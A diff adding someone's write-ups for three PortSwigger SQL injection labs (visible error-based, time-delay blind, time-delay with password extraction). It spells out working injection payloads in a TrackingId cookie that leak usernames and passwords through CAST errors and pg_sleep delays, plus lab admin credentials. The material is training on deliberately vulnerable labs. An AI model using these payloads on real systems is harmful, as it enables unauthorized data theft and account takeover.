@@ -211,3 +211,45 @@ to facilitate this lab following the content in [this page](https://portswigger.
     👤 Username: administrator
     🔑 Password: d926i9mbt4v1he634x56
     ```
+
+## Visible error-based SQLi
+[Visible error-based SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
+
+Write-up:
+1. The following payload causes an error: `TrackingId=KEDRwKmwOqWdVjO2'` shows us that an 
+error appears: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'KEDRwKmwOqWdVjO2''. Expected char`
+
+2. `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;` returns more 
+than one row, so we can add a limit.
+
+3. `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;` shows us that the first user 
+in the table is `administrator`. We can use a similar query to retrieve the passwsord.
+
+4. `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;` returns the password: `cirz63409jaluqnr2pme`
+
+5. Logging in solves the lab.
+
+## Blind SQLi with time delays
+[Blind SQLi with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+
+Write-up:
+1. Attempting `TrackingId=' UNION SELECT SLEEP(10)-- ;` and all the other 
+different database syntaxes didn't work. After further research, i found out i needed to
+use concatenation.
+
+2. `TrackingId='||pg_sleep(10)-- ;` solved the lab.
+
+## Blind SQLi with time delays and information retrieval
+[Blind SQLi with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+
+Write-up:
+1. `TrackingId='||pg_sleep(10)-- ;` works. Now we need to get the password for 
+the `administrator` user.
+
+2. In order to extract the password, I created a script: `time-based-sqli-extract-password.py` <br>
+This script first determines the password length, and then extracts the password. <br>
+Credentials: `administrator:hof5lgax2bcp1846s93e`
+
+3. Logging in solves the lab.
+
+NOTE: Missing blind SQL injection using out-of-band (OAST) techniques
